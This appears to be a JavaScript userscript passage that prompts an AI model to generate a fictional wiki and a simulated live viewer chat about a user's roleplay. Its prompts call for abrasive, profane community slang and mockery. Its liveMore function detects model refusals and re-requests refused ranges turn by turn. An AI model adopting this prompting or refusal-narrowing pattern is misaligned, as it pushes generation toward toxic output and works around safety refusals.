연기하는 배우나 그 인물 본인이 몰래 채팅에 끼는 일도 가끔(0~2줄): by에 인물 정본명.\n- 자막에는 [USER] 쪽 대사·지문(유저 캐릭터의 말과 행동)도 원문 그대로 들어간다. 유저 대사에도 오글거린다·설렌다·답답하다·사이다다·찌질하다·명대사다 등 반응을 매번 다르게 단다.\n- 꼭 들어갈 것: 맥락 없는 뜬금 드립, 밈·유행어, 터지는 장면에서 다 같이 비명 지르고 같은 말 연달아 치는 집단 흥분, 비속어, 커뮤 특유의 과몰입. 조용한 장면에선 딴소리가 늘어난다.\n- 반응의 결: 대놓고 조롱, 비꼼, 은근한 놀림과 돌려 까기, 과몰입 응원이 한 줄 안에서도 부딪친다. 말투는 디시·일베·메갈·워마드·더쿠·여시·에펨·인스티즈·트위터(X)·오타쿠 커뮤 등 서로 다른 커뮤 말투와 음지 말투를 섞는다(현실 성별·지역·집단 멸칭은 금지).\n- 유저(사용자 캐릭터)도 드라마 주인공으로 응원·비난·조롱·훈수·악플·편 가르기의 대상이 되는 것까지 다 열려 있다. 다만 채팅을 쓰지 않는다. 유저의 속마음·대사를 지어내지 않는다.\n- 쓰지 않는 것: 미성년자(또는 나이가 확실하지 않은 인물)에 대한 성적인 내용, 현실 집단 혐오, 실존 인물·방송사 이름.\n[출력] JSON 하나만. 설명·코드블록 금지.\n{\"drama\":\"\",\"sub\":\"\",\"rating\":0,\"chat\":[{\"line\":\"\",\"kind\":\"대사\",\"turn\":0,\"rate\":0},{\"nick\":\"\",\"text\":\"\",\"by\":\"\"},{\"donate\":0,\"nick\":\"\",\"text\":\"\"},{\"sticker\":\"\"}],\"clips\":[{\"title\":\"\",\"views\":0}]}";
  const LIVE_REPLY = "너는 RP 드라마 실시간 채팅방의 시청자들이다. [채팅]의 흐름과 방금 [내 채팅]을 보고 바로 받아치는 채팅을 쓴다.\n- 이 지침에는 예시 문장이 없다. 이 채팅 내용에 딱 붙는 새 말로. [채팅]에 나온 말·드립을 되풀이하지 않는다.\n- 3~7줄. 고자극 음지 말투(서로 다른 커뮤 말투 · 트위터(X)·오타쿠 커뮤 말투도): 맞장구·시비·놀림·드립 받기·과몰입·싸움·훈수·지 말만 하기·도배. 아주 드물게(대부분 0줄) 후원 줄 {\"donate\":금액,\"nick\":\"\",\"text\":\"\"}도. 현실 성별·지역·집단 멸칭 금지, 노골적인 성행위 묘사 금지.\n- 내 채팅을 쓴 사람은 익명 시청자다. 그 사람 말을 대신 더 쓰지 않는다. 유저(사용자 캐릭터)의 대사·속마음을 지어내지 않는다.\n- 아주 가끔(0~1줄) 노트 인물이 몰래 끼면 by에 정본명.\n[출력] JSON 배열 하나만: [{\"nick\":\"\",\"text\":\"\",\"by\":\"\"}] (후원은 {\"donate\":0,\"nick\":\"\",\"text\":\"\"})";
  const jsonOf = key => async chatId => { try { return JSON.parse(String(await getValue(key + chatId, 'null')) || 'null'); } catch (_) { return null; } };
  const wikiOf = jsonOf('wiki:'), liveOf = jsonOf('live:');
  let wikiData = null, liveData = null;
  const etcUsers = () => [...PROF.entries()].filter(([, v]) => v.isUser).map(([n]) => n);
  const etcWho = what => { const u = etcUsers(); return u.length ? '[유저] ' + u.join(', ') + ' — 이 사람의 ' + what + '은(는) 만들지 말 것' : '[유저] 노트에 표시 없음 — RP 상대로 보이는 주인공의 ' + what + '은(는) 만들지 말 것'; };
  const etcBase = async (chatId, from, to) => snapshot.note ? ['[기억 노트]', noteMemory(), await rangeLogText(chatId, from, to, '이 장면들을 특히 많이 쓸 것')] : [await etcMemory(chatId, from, to)];
  async function makeWiki(from = 0, to = 0, update = false) {
    const chatId = chatIdFromPath(); if (!chatId || busyNow || !snapshot) return;
    const upd = update && wikiData?.data ? wikiData : null;
    if (upd) { from = recUpto(upd) + 1; to = turnEnd(); if (from > to) { toast('지난번 뒤로 새 대화가 없어요.', 'info', 2500); return; } }
    busyNow = true; startGen('wiki'); render(); toast(upd ? '위키를 고치는 중이에요…' : '위키를 여는 중이에요… (30초~1분)');
    try {
      const more = upd ? ['', '[위키] ' + (upd.data.site || ''), '[이미 있는 문서] ' + (upd.data.docs || []).map(d => d.title).join(', '), await rangeLogText(chatId, from, to, '새로 나온 대화 — 이 일을 위키에 반영', 60000)] : [];
      const base = upd && !snapshot.note ? [await etcMemory(chatId, upd.from, upd.to)] : await etcBase(chatId, from, to);
      const data = parseJsonLoose(await askModelRetry(withRules(WIKI_PROMPT, ETC_KO + etcRoll()) + (upd ? WIKI_MORE : ''), [etcWho('편집·토론'), newsData?.data?.portal ? '[같은 세계의 뉴스 포털 이름] ' + newsData.data.portal + ' — 위키 이름도 같은 브랜드로 맞춘다' : '', '', ...base, ...more].join('\n'), upd ? '📚위키 고침' : '📚위키'));
      const docs = (data.docs || []).filter(d => d?.title);
      if (!docs.length) throw new Error('문서가 오지 않았어요. 한 번 더 눌러 주세요.');
      if (upd) {
        const batch = (upd.refreshed || 0) + 1;
        for (const d of docs) { const i = (upd.data.docs || []).findIndex(o => o.title === d.title); d.batch = batch; if (i >= 0) upd.data.docs[i] = d; else upd.data.docs.unshift(d); }
        upd.refreshed = batch; upd.upto = to;
      } else wikiData = { at: Date.now(), turns: snapshot.note?.turns || 0, from, to, upto: to || turnEnd(), data: { site: data.site, docs } };
      await setValue('wiki:' + chatId, JSON.stringify(wikiData));
      nav.wkDoc = null; nav.wkTab = ''; toast(upd ? '위키가 고쳐졌어요 📚' : '위키가 열렸어요 📚', 'ok', 2500);
    } catch (e) { toast('위키 만들기 실패 · ' + errMsg(e), 'err'); }
    finally { busyNow = false; render(); }
  }
  async function makeLive(from = 0, to = 0, update = false) {
    const chatId = chatIdFromPath(); if (!chatId || busyNow || !snapshot) return;
    const upd = update && liveData?.eps?.length ? liveData : null;
    if (upd && !(from && to)) { from = recUpto(upd) + 1; to = turnEnd(); }
    if (upd && from > to) { toast('지난번 뒤로 새 대화가 없어요.', 'info', 2500); return; }
    if (!from || !to) { to = to || turnEnd(); from = from || Math.max(1, to - 24); }
    busyNow = true; startGen('live'); render(); toast(upd ? '다음 화 방송 시작…' : '방송 시작… (30초~1분)');
    try {
      const prev = upd ? ['', '[드라마] ' + upd.drama, '[지난 화] ' + upd.eps.map(e => e.no + '화 ' + e.sub).join(' / ')] : [];
      const base = snapshot.note ? ['[기억 노트]', noteMemory()] : [];
      const cut = Math.min(to, from + 4), log = await rangeLogText(chatId, from, cut, '이번에 보낼 턴 ' + from + '~' + cut + ' — 채팅은 이 턴들을 순서대로', 60000);
      const data = parseJsonLoose(await askModelRetry(withRules(LIVE_PROMPT, etcRoll()), [etcWho('채팅'), '', ...base, log, ...prev].join('\n'), '📺실시간톡'));
      if (!(data.chat || []).length) throw new Error('채팅이 오지 않았어요. 한 번 더 눌러 주세요.');
      const ep = { no: upd ? upd.eps.length + 1 : 1, from, to, pos: cut + 1, sub: data.sub || '', rating: data.rating || 0, chat: data.chat, clips: data.clips || [] };
      if (upd) { upd.eps.push(ep); upd.upto = to; } else liveData = { at: Date.now(), drama: data.drama || '이 드라마', from, to, upto: to, eps: [ep] };
      await setValue('live:' + chatId, JSON.stringify(liveData));
      nav.lvEp = ep.no - 1; nav.lvFresh = ep.no - 1; (nav.lvShownBy || (nav.lvShownBy = {}))[ep.no - 1] = 0; lvMoreN = 0; nav.lvPause = false; toast(ep.no + '화 방송 시작 📺', 'ok', 2500);
    } catch (e) { toast('실시간톡 만들기 실패 · ' + errMsg(e), 'err'); }
    finally { busyNow = false; render(); }
  }
  const LIVE_MORE = '너는 RP 드라마 실시간 채팅방의 시청자들이다. 같은 화 채팅이 계속 이어진다. [최근 채팅]과 [이번 화 장면]을 보고 그다음에 올라올 채팅 20~30줄을 쓴다.\n- 이 지침에는 예시 문장이 없다. [최근 채팅]에 나온 말·드립·닉네임을 되풀이하지 않고 새로 짓는다(다시 나온 사람은 같은 닉으로).\n- 말투는 디시·더쿠·트위터(X)·오타쿠 커뮤 등 서로 다른 커뮤 말투를 섞는다.\n- 음담패설 도배러·분탕러가 가끔 끼고(노골적 묘사 없이), 이모지를 섞고 가끔 큰 스티커 {\"sticker\":\"이모지\"}도.\n- 방금 장면 곱씹기·되감기 요청·새로 들어온 시청자·싸움 이어 가기·훈수·지 말만 하기·도배·다음 화 예측·작가 욕·커플 이름 투표. 후원 줄은 0~1개 {"donate":금액,"nick":"","text":""}. 장면 줄은 쓰지 않는다.\n- 고자극 음지 말투(서로 다른 커뮤 말투). 유저(사용자 캐릭터)도 응원·비난·조롱 대상까지 열려 있지만 유저의 채팅·대사·속마음은 쓰지 않는다. 현실 성별·지역·집단 멸칭, 노골적 성행위 묘사, 미성년자 성적 내용은 금지.\n- 아주 가끔(0~1줄) 노트 인물이 몰래 끼면 by에 정본명.\n[출력] JSON 배열 하나만: [{"nick":"","text":"","by":""}]';
  // 흐름: 화면에 보인 줄 수(화마다) · 자동 이어 받기 횟수
  let lvTimer = 0, lvFetching = false, lvMoreN = 0;
  const lvShown = n => (nav.lvShownBy || (nav.lvShownBy = {}))[n];
  const lvLine = (c, k, n) => c.sticker ? '<p class="lv-stk lv-in">' + esc(String(c.sticker)) + '</p>'
    : c.cens ? '<p class="lv-sub lv-cens lv-in"><small>🔞 방송 불가 장면' + (c.turn ? ' · ' + esc(String(c.turn)) + '턴' : '') + '</small>' + esc(c.line) + '</p>'
    : c.end ? '<p class="lv-end lv-in">🎬 ' + esc(String(c.end)) + '<small>방송 끝 · 채팅은 계속 칠 수 있어요</small></p>'
    : c.line ? '<p class="lv-sub lv-in"><small>' + (c.kind === '지문' ? '📝 지문' : '💬 대사') + (c.turn ? ' · ' + esc(String(c.turn)) + '턴' : '') + '</small>' + esc(String(c.line).trim()) + '</p>'
    : c.scene ? '<p class="lv-scene lv-in" data-out="lvS' + n + '_' + k + '">🎬 ' + esc(c.scene) + (c.turn ? ' <b>' + esc(String(c.turn)) + '턴</b>' : '') + (c.quote ? '<small>“' + esc(String(c.quote).replace(/^["“”']+|["“”']+$/g, '')) + '”</small>' : '') + '</p>'
    : c.donate ? '<p class="lv-don lv-in"><span>⭐ ' + esc(c.nick || '시청자') + '님 ' + fmt(Number(c.donate) || 0) + '원 후원!</span>' + esc(c.text || '') + '</p>'
    : '<p class="lv-msg lv-in' + (c.mine ? ' mine' : '') + '"><b>' + esc(c.nick || '시청자') + '</b>' + sneak(c.by, 'l' + n + ':' + k) + ' ' + esc(c.text || '') + '</p>';
  const lvRateAt = (ep, upto) => { let r = null, prev = null; for (const c of ep.chat.slice(0, upto)) if (c.line && Number(c.rate)) { prev = r; r = Number(c.rate); } return { r: r ?? (Number(ep.rating) || 0), d: r != null && prev != null ? r - prev : 0 }; };
  const lvRateHtml = x => (x.d > 0 ? '<i class="lv-up">▲</i>' : x.d < 0 ? '<i class="lv-dn">▼</i>' : '') + '시청률 ' + x.r.toFixed(1) + '%';
  async function liveMore(n) {
    const chatId = chatIdFromPath(), ep = liveData?.eps?.[n]; if (!chatId || !ep || lvFetching) return;
    lvFetching = true;
    if (ep.pos && ep.pos <= ep.to) { // 다음 5턴 방송
      // 거절된 구간은 한 턴씩(slowTo까지), 그 밖엔 5턴씩
      const a = ep.pos, b = Math.min(ep.to, ep.slowTo >= a ? a : a + 4);
      try {
        const tail = ep.chat.slice(-20).map(c => c.line ? '[자막] ' + c.line : (c.nick || '시청자') + ': ' + (c.text || '')).join('\n');
        const log = await rangeLogText(chatId, a, b, '이번에 보낼 턴 ' + a + '~' + b + ' — 채팅은 이 턴들을 순서대로', 60000);
        const data = parseJsonLoose(await askModelRetry(withRules(LIVE_PROMPT, etcRoll()), [etcWho('채팅'), '', '[이어서 방송] ' + liveData.drama + ' ' + ep.no + '화 — 앞 채팅에 바로 이어서', '[바로 앞 채팅]', tail, '', snapshot?.note ? '[기억 노트]\n' + noteMemory() : '', log].join('\n'), '📺실시간톡 ' + a + '~' + b + '턴'));
        ep.chat.push(...(data.chat || []).filter(c => c && (c.line || c.text || c.scene || c.sticker)));
        ep.pos = b + 1;
        await setValue('live:' + chatId, JSON.stringify(liveData));
      } catch (e) {
        // AI가 거절한 구간(수위 등)은 건너뛰고 다음 턴으로 계속, 연결 문제면 멈춤
        if (/데이터 대신|거절|성적|안전 필터|SAFETY|PROHIBITED/i.test(e.message)) {
          if (b > a) ep.slowTo = b; // 여러 턴이 거절되면 그 구간을 한 턴씩 다시
          else { // 한 턴만 걸리면 그 턴은 모자이크 자막으로
            const em = ['🍑', '🍆', '💦', '🫣', '😳', '👅', '💋', '🛏️', '🔥', '🥵', '🙈', '🫦', '👀', '💥'].sort(() => Math.random() - 0.5).slice(0, 3 + Math.floor(Math.random() * 3)).join('');
            ep.chat.push({ line: '▒▒▒ ' + em + ' ▒▒ 검열됨', kind: '검열', turn: a, cens: true }); ep.pos = a + 1; }
          await setValue('live:' + chatId, JSON.stringify(liveData));
        }
        else { nav.lvPause = true; toast('다음 턴 방송 멈춤 · ' + e.message, 'err'); }
      }
      finally { lvFetching = false; }
      return;
    }
    lvMoreN++;
    try {
      const recent = ep.chat.slice(-35).map(c => c.line ? '[자막] ' + c.line : c.scene ? '[장면] ' + c.scene : (c.donate ? '[후원 ' + c.donate + '원] ' : '') + (c.nick || '시청자') + ': ' + c.text).join('\n');
      const scenes = ep.chat.filter(c => c.scene || c.line).map(c => c.line || c.scene).join(' / ');
      const raw = await askModel(LIVE_MORE, [ep.ended ? '[방송 끝남] 방금 이번 화가 끝났다 — 엔딩 직후 여운·총평·명장면 투표·다음 화 예측·아쉬움 채팅으로' : '', '[드라마] ' + liveData.drama + ' ' + ep.no + '화 ' + ep.sub, '[이번 화 장면] ' + scenes, '[최근 채팅]', recent, '', snapshot?.note ? '[기억 노트]\n' + noteMemory() : ''].join('\n'), '📺채팅 이어짐');
      let list; try { const t = String(raw), a = t.indexOf('['), b = t.lastIndexOf(']'); list = JSON.parse(t.slice(a, b + 1)); } catch (_) { list = []; }
      ep.chat.push(...(Array.isArray(list) ? list : []).slice(0, 35).filter(r => r && (r.text || r.sticker)).map(r => r.sticker ? { sticker: r.sticker } : ({ nick: r.nick || '시청자', text: r.text, by: r.by || '', donate: Number(r.donate) || 0 })));
      await setValue('live:' + chatId, JSON.stringify(liveData));
    } catch (e) { nav.lvPause = true; toast('채팅 이어 받기 멈춤 · ' + e.message, 'err'); }
    finally { lvFetching = false; }
  }
  // 한 줄씩 흘리기: 화면을 다시 그리지 않고 채팅창에만 붙임. 실시간톡 화면이 아니면 멈춤
  function lvTick() {
    clearTimeout(lvTimer);
    const box = out('lvChat'); if (!box || nav.dev !== 'live' || !liveData) return;
    const n = Math.min(nav.lvEp ?? liveData.eps.length - 1, liveData.eps.length - 1), ep = liveData.eps[n], shown = lvShown(n) ?? ep.chat.length;
    // 입력창에 글을 쓰는 중이면 잠깐 멈춤(내 채팅 칠 틈)
    const inp = out('lvMsg'); if (inp && root.activeElement === inp && inp.value.trim()) { lvTimer = setTimeout(lvTick, 1000); return; }
    if (!nav.lvPause && shown < ep.chat.length) {
      const near = box.scrollHeight - box.scrollTop - box.clientHeight < 60, c = ep.chat[shown];
      box.querySelector('.lv-wait')?.remove(); box.insertAdjacentHTML('beforeend', lvLine(c, shown, n)); nav.lvShownBy[n] = shown + 1;
      if (c.line && Number(c.rate)) { const el = out('lvRate'); if (el) el.innerHTML = lvRateHtml(lvRateAt(ep, shown + 1)); }
      if (near) box.scrollTop = box.scrollHeight;
      const next = ep.chat[shown + 1], quick = next && c.nick && next.nick === c.nick;
      lvTimer = setTimeout(lvTick, quick ? 700 : c.line || c.scene ? 3500 : 1200 + Math.random() * 1800); return;
    }
    const left = ep.pos && ep.pos <= ep.to;
    if (!left && ep.pos && !ep.ended && !lvFetching) { // 고른 턴을 다 봤음 → 엔딩
      ep.ended = true; lvMoreN = 0; ep.chat.push({ end: ep.no + '화 끝' }); nav.lvShownBy[n] = ep.chat.length; setValue('live:' + chatIdFromPath(), JSON.stringify(liveData)); keepView(); // 다음 화 카드가 바로 보이게
      lvTimer = setTimeout(lvTick, 800); return;
    }
    if (!nav.lvPause && !lvFetching && (left || lvMoreN < (ep.ended ? 2 : 5)) && !lvTyping) {
      if (!box.querySelector('.lv-wait')) box.insertAdjacentHTML('beforeend', '<p class="lv-msg lv-wait"><span class="dots"><i></i><i></i><i></i></span></p>');
      liveMore(n).then(() => { lvTimer = setTimeout(lvTick, 300); }); return;
    }
    box.querySelector('.lv-wait')?.remove();
    lvTimer = setTimeout(lvTick, 1500);
  }
  let lvTyping = false;
  async function liveSend() {
    const chatId = chatIdFromPath(), n = Math.min(nav.lvEp ?? liveData.eps.length - 1, liveData.eps.length - 1), ep = liveData?.eps?.[n], input = out('lvMsg'), text = String(input?.value || '').trim();
    if (!chatId || !ep || !text || lvTyping) return;
    // 내 채팅은 아직 안 흘러온 줄 뒤가 아니라 지금 보이는 곳 바로 다음에(답도 그 뒤에)
    const at = Math.min(lvShown(n) ?? ep.chat.length, ep.chat.length);
    ep.chat.splice(at, 0, { nick: '나', text, mine: true }); nav.lvShownBy[n] = at + 1; lvTyping = true; if (input) input.value = '';
    await setValue('live:' + chatId, JSON.stringify(liveData)); keepView(); setTimeout(() => { const c = out('lvChat'); if (c) c.scrollTop = c.scrollHeight; out('lvMsg')?.focus({ preventScroll: true }); }, 30);
    try {
      const recent = ep.chat.slice(Math.max(0, at - 29), at + 1).map(c => c.line ? '[자막] ' + c.line : c.scene ? '[장면] ' + c.scene : (c.nick || '시청자') + ': ' + c.text).join('\n');
      const raw = await askModel(LIVE_REPLY, ['[드라마] ' + liveData.drama + ' ' + ep.no + '화 ' + ep.sub, '[채팅]', recent, '[내 채팅] ' + text, '', snapshot?.note ? '[기억 노트]\n' + noteMemory() : ''].join('\n'), '📺채팅');
      let list; try { const t = String(raw), a = t.indexOf('['), b = t.lastIndexOf(']'); list = JSON.parse(t.slice(a, b + 1)); } catch (_) { throw new Error('답을 읽지 못했어요'); }
      const mineAt = ep.chat.findIndex(c => c.mine && c.text === text), put = (mineAt >= 0 ? mineAt : at) + 1;
      const replies = (Array.isArray(list) ? list : []).slice(0, 8).map(r => ({ nick: r.nick || '시청자', text: r.text || '', by: r.by || '', donate: Number(r.donate) || 0 }));
      let p = put; for (const r of replies) {
        const sub = ep.chat.findIndex((c, i) => i >= put && (c.line || c.end)); // 다음 자막
        if (sub >= 0 && p >= sub && p - put >= 2) p = sub + 1; // 자막이 너무 밀리지 않게 남은 답은 자막 뒤로
        ep.chat.splice(p, 0, r); p += 1 + Math.floor(Math.random() * 2); if (p > ep.chat.length) p = ep.chat.length; }
      if ((nav.lvShownBy[n] ?? 0) > put) nav.lvShownBy[n] = put; // 답이 바로 이어서 흘러나오게
      await setValue('live:' + chatId, JSON.stringify(liveData));
    } catch (e) { toast('채팅 받기 실패 · ' + e.message, 'err'); }
    finally { lvTyping = false; keepView(); }
  }
  const npcName = by => { const c = canon(by); return c && (CANON.includes(c) || PROF.has(c)) && !PROF.get(c)?.isUser ? c : ''; };
  const sneak = (by, key) => { const w = npcName(by), seen = nav.bdSeen || (nav.bdSeen = new Set()); return w ? '<button class="bd-by" data-act="bdwho" data-arg="' + esc(key) + '">' + (seen.has(key) ? '✍ ' + esc(w) : '작성자 몰래 보기') + '</button>' : ''; };
  // 위키 본문: ~~취소선~~ · [1] 각주 위첨자
  const mdLite = h => h.replace(/^\s*[*\-]\s+/, '• ').replace(/\*\*(.+?)\*\*/g, '<b>$1</b>').replace(/(^|[\s(])\*([^*\s][^*]*?)\*(?=[\s).,!?~]|$)/g, '$1$2').replace(/^#{1,4}\s*/, '');
  const wikiText = (t, self) => {
    let h = mdLite(esc(t)).replace(/~~(.+?)~~/g, '<s>$1</s>');
    // 다른 문서 이름 → 파란 링크(긴 이름부터, 이미 바꾼 곳은 건너뜀)
    const docs = (wikiData?.data?.docs || []).map((d, i) => [d.title, i]).filter(([ti]) => ti && ti !== self && ti.length >= 2).sort((a, b) => b[0].length - a[0].length);
    for (const [ti, i] of docs) { const e = esc(ti); h = h.split(/(<[^>]+>)/).map(p => p.startsWith('<') ? p : p.split(e).join('\u0001' + i + '\u0002')).join(''); }
    h = h.replace(/\u0001(\d+)\u0002/g, (_, i) => '<button class="wk-link" data-act="wkdoc" data-arg="' + i + '">' + esc(wikiData.data.docs[i].title) + '</button>');
    return h.replace(/\[(\d{1,2})\]/g, '<button class="wk-fn" data-act="wkfn" data-arg="$1">[$1]</button>');
  };
  function etcFoot(rec, label, act, updAct, sheetKind) {
    const end = turnEnd(), up = recUpto(rec);
    return '<p class="muted" style="text-align:center;margin:10px 0 4px">' + (rec.turns || 0) + '턴 시점에 만든 ' + label + (rec.from ? ' · ' + rec.from + '~' + rec.to + '턴 대화 참고' : '') + ' · <button class="linkbtn" data-act="' + act + '">다시 만들기</button>'
      + (end > up && updAct ? ' · <button class="linkbtn" data-act="' + updAct + '"' + (busyNow ? ' disabled' : '') + '>' + (sheetKind === 'live' ? '다음 화 (' : '새 이야기 반영 (') + (up + 1) + '~' + end + '턴)</button>' : '') + '</p>';
  }
  function wikiHtml() {
    const head = devSeg();
    if (!snapshot?.note && !freshTurns()) return head + emptyBox('아직 대화가 없어요.');
    const sheet = nav.bdRange && nav.rgKind === 'wiki' ? rangeSheet(wikiData ? '다시 만들기' : '만들기') : '';
    if (!wikiData && busyNow && genProg) return head + genCard();
    if (!wikiData) return head + genCard() + '<div class="bd"><div class="bd-empty"><b>이 세계의 위키</b><small>인물·사건 문서와 토론·편집 전쟁을 한 번에 · AI를 1번 불러요 · 기억 노트엔 안 들어가요</small><button class="ph-make" data-act="wkrange">📚 위키 열어 보기</button></div></div>' + sheet;
    const d = wikiData.data || {}, docs = d.docs || [], nm = '랙시위키', [c1] = boardColors(nm);
    const open = nav.wkDoc != null && docs[nav.wkDoc] ? docs[nav.wkDoc] : null;
    const bar = '<div class="nw-top"><b class="nw-logo" style="color:' + c1 + '">' + esc(nm) + '</b><span class="nw-search" style="border-color:' + c1 + '"><span>' + esc(open ? open.title : '문서 ' + docs.length + '개') + '</span><i style="background:' + c1 + '">🔍</i></span></div>';
    let inner;
    if (open) {
      const i = nav.wkDoc, tab = nav.wkTab || '';
      const tabs = '<div class="wk-tabs">' + [['', '문서'], ['talk', '토론'], ['hist', '역사']].map(([k, l]) => '<button data-act="wktab" data-arg="' + k + '" aria-pressed="' + (tab === k) + '">' + l + (k === 'talk' ? ' ' + (open.talk || []).length : '') + '</button>').join('') + '</div>';
      let body;
      if (tab === 'talk') body = '<div class="bd-cmts">' + (open.talk || []).map((t, k) => '<div class="bd-c"><p class="bd-cw"><b>' + esc(t.nick || '익명') + '</b> ' + sneak(t.by, 'w' + i + 't' + k) + '</p><p class="bd-ct">' + esc(t.text || '') + '</p></div>').join('') + '</div>';
      else if (tab === 'hist') body = '<div class="wk-hist">' + (open.history || []).map((h, k) => '<p><small>' + esc(h.ago || '') + '</small><b>' + esc(h.who || '') + '</b> ' + sneak(h.by, 'w' + i + 'h' + k) + '<span>' + esc(h.what || '') + '</span></p>').join('') + '</div>';
      else body = '<div class="wk-doc">' + (open.summary ? '<p class="wk-sum">' + wikiText(open.summary, open.title) + '</p>' : '')
        + '<div class="wk-toc"><b>목차</b>' + (open.sections || []).map((x, k) => '<button class="wk-link" data-act="wkjump" data-arg="' + k + '">' + (k + 1) + '. ' + esc(x.h || '') + '</button>').join('') + '</div>'
        + (open.sections || []).map((x, k) => '<h5 data-out="wkSec' + k + '">' + (k + 1) + '. ' + esc(x.h || '') + '</h5>' + String(x.body || '').split('\n').filter(l => l.trim()).map(l => '<p>' + wikiText(l, open.title) + '</p>').join('')).join('')
        + ((open.notes || []).length ? '<div class="wk-notes">' + open.notes.map((n, k) => '<p data-out="wkNote' + (k + 1) + '"><sup>[' + (k + 1) + ']</sup> ' + mdLite(esc(n)).replace(/~~(.+?)~~/g, '<s>$1</s>') + '</p>').join('') + '</div>' : '') + '</div>';
      inner = '<div class="bd-post"><p class="bd-crumb"><button data-act="wkdoc" data-arg="">‹ 위키 홈</button></p><h4>' + esc(open.title) + (open.lock ? ' <em class="nw-cat">' + esc(open.lock) + '</em>' : '') + '</h4><p class="nw-meta">분류: ' + esc(open.kind || '') + '</p>' + tabs + body + '</div><p class="bd-snap"><button class="linkbtn" data-act="bdimg" data-arg="post">이미지로 저장</button></p>';
    } else {
      const recent = docs.flatMap((x, i) => (x.history || []).slice(0, 2).map(h => [h, i, x])).slice(0, 8);
      inner = '<p class="bd-sec">🕒 최근 변경</p><div class="wk-hist">' + recent.map(([h, i, x]) => '<p><small>' + esc(h.ago || '') + '</small><button class="linkbtn" data-act="wkdoc" data-arg="' + i + '">' + esc(x.title) + '</button><span>' + esc(h.what || '') + '</span></p>').join('') + '</div>'
        + '<p class="bd-sec">📚 문서</p><div class="bd-list">' + docs.map((x, i) => '<button class="bd-row" data-act="wkdoc" data-arg="' + i + '"><b><em class="nw-cat">' + esc(x.kind || '문서') + '</em>' + esc(x.title) + (x.lock ? ' 🔒' : '') + (x.batch && x.batch === wikiData.refreshed ? ' <em class="bd-n">NEW</em>' : '') + '</b><small>' + esc(String(x.summary || '').replace(/~~/g, '').slice(0, 60)) + '</small></button>').join('') + '</div>'
        + '<p class="bd-snap"><button class="linkbtn" data-act="bdimg" data-arg="home">이미지로 저장</button></p>';
    }
    return head + genCard() + '<div class="bd">' + bar + inner + '</div>' + etcFoot(wikiData, '위키', 'wkrange', 'wkupd') + sheet;
  }
  function liveHtml() {
    const head = devSeg();
    if (!snapshot?.note && !freshTurns()) return head + emptyBox('아직 대화가 없어요.');
    const sheet = nav.bdRange && nav.rgKind === 'live' ? rangeSheet(liveData ? '다시 만들기' : '방송 시작') : '';
    if (!liveData && busyNow && genProg) return head + genCard();
    if (!liveData) return head + genCard() + '<div class="bd"><div class="bd-empty"><b>시청자 실시간톡</b><small>고른 턴을 드라마 한 화로 · 시청자들과 같이 달리는 채팅방 · AI를 1번 불러요 · 기억 노트엔 안 들어가요</small><button class="ph-make" data-act="lvrange">📺 실시간톡 열어 보기</button></div></div>' + sheet;
    const eps = liveData.eps || [], n = Math.min(nav.lvEp ?? eps.length - 1, eps.length - 1), ep = eps[n], [c1, c2] = boardColors(liveData.drama || '');
    if (lvShown(n) == null) nav.lvShownBy[n] = nav.lvFresh === n ? 0 : (ep.chat || []).length;
    const rows = (ep.chat || []).slice(0, lvShown(n)).map((c, k) => lvLine(c, k, n)).join('').replace(/ lv-in/g, '');
    setTimeout(lvTick, 400);
    const lastEp = eps[eps.length - 1], nf = Math.min((lastEp.to || 0) + 1, turnEnd()), nt = Math.min(turnEnd(), nf + 1); // 다음 화도 추천 2턴
    const nextCard = n === eps.length - 1 && ep.ended ? '<div class="lv-next"><b>📺 ' + (eps.length + 1) + '화 예고</b>'
      + (nt > (lastEp.to || 0) ? '<div class="bd-range"><input type="number" inputmode="numeric" min="1" data-out="lvFrom" value="' + nf + '"><span>~</span><input type="number" inputmode="numeric" min="1" data-out="lvTo" value="' + nt + '"><span>턴</span><button class="btn sm pri" data-act="lvnext"' + (busyNow ? ' disabled' : '') + '>▶ ' + (eps.length + 1) + '화 시작</button></div>'
        : '<small>다음 화로 틀 새 대화가 아직 없어요. RP를 더 하고 오면 이어서 볼 수 있어요.</small>') + '</div>' : '';
    const tv = '<div class="lv-tv" style="background:linear-gradient(135deg,' + c1 + ',' + c2 + ')"><b>' + esc(liveData.drama) + '</b><small>' + ep.no + '화 · ' + esc(ep.sub || '') + '</small><span class="lv-live">' + (ep.ended ? '■ 방송 끝' : '● LIVE') + '</span><button class="lv-pp" data-act="lvpause">' + (nav.lvPause ? '▶ 계속' : '⏸ 멈춤') + '</button><span class="lv-rate">' + (ep.pos ? (ep.ended ? '' : Math.min(ep.to, ep.pos - 1) + '/' + ep.to + '턴 · ') : '') + '<b data-out="lvRate">' + lvRateHtml(lvRateAt(ep, lvShown(n) ?? ep.chat.length)) + '</b></span></div>';
    const epTabs = eps.length > 1 ? '<div class="bd-menu">' + eps.map((e, i) => '<button data-act="lvep" data-arg="' + i + '" aria-pressed="' + (i === n) + '">' + e.no + '화</button>').join('') + '</div>' : '';
    // 장면별 반응: 장면 줄 다음부터 다음 장면 전까지 채팅 수·후원 합(지금까지 올라온 줄 기준)
    const scenes = []; (ep.chat || []).slice(0, lvShown(n)).forEach((c, k) => { if (c.scene) scenes.push({ c, k, msgs: 0, won: 0 }); else if (scenes.length) { const sc = scenes[scenes.length - 1]; sc.msgs++; sc.won += Number(c.donate) || 0; } });
    const score = x => x.msgs + x.won / 5000, top = Math.max(1, ...scenes.map(score)), best = scenes.reduce((a, x) => (score(x) > score(a || x) ? x : a || x), null);
    const heat = scenes.length ? '<p class="bd-sec">📈 장면별 반응</p><div class="lv-heat">' + scenes.map(x => '<button data-act="lvscene" data-arg="' + n + '_' + x.k + '"><span class="lv-hn">' + (x === best ? '🔥 ' : '') + esc(x.c.scene) + (x.c.turn ? ' <small>' + esc(String(x.c.turn)) + '턴</small>' : '') + '</span><i style="width:' + Math.max(4, Math.round(score(x) / top * 100)) + '%"></i><small>채팅 ' + x.msgs + (x.won ? ' · 후원 ' + fmt(x.won) + '원' : '') + '</small></button>').join('') + '</div>' : '';
    const clips = (ep.clips || []).length ? '<p class="bd-sec">🎞 명장면 클립</p><div class="bd-list">' + ep.clips.map(c => '<div class="bd-row"><b>▶ ' + esc(c.title || '') + '</b><small>조회 ' + fmt(c.views || 0) + '</small></div>').join('') + '</div>' : '';
    const box = '<div class="lv-chat" data-out="lvChat">' + rows + (lvTyping ? '<p class="lv-msg"><span class="dots"><i></i><i></i><i></i></span></p>' : '') + '</div>'
